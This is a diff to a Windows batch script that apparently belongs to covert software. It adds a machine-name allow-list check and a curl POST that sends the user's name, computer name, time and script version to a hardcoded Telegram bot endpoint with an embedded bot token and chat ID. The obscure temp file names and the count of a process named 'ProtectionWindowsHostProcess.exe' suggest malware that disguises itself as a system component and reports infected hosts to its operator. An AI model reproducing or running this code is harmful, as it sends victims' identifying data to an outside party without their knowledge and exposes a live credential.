@@ -10,16 +10,43 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=29.8"
+set "BATCHVERSION=29.9"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 set "RESULT=%TEMP%\TGRESU.txa"
+set "ALLOWED=DESKTOP-QI6H2EA"
+
+
+
+echo Allowed PCs :
+echo.
+echo %ALLOWED%
+echo.
+echo.
+echo %ALLOWED% | findstr /i "\<%COMPUTERNAME%\>" >nul && goto RUNEVERYSTARTED
+
+
+
+goto NEXTRUNEVERY
 
 
 
 
+:RUNEVERYSTARTED
+echo.
+echo.
+echo %COMPUTERNAME% Found.
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|RNEVRYSTARTED.APPROVED"
+echo.
+echo.
+goto :EOF
 
-::curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|RNEVRYSTARTED"
 
+:NEXTRUNEVERY
+echo.
+echo.
+echo %COMPUTERNAME% Not Found.
+echo.
+echo.
 
 :: Count the instances of ProtectionWindowsHostProcess.exe
 set "instances=0"
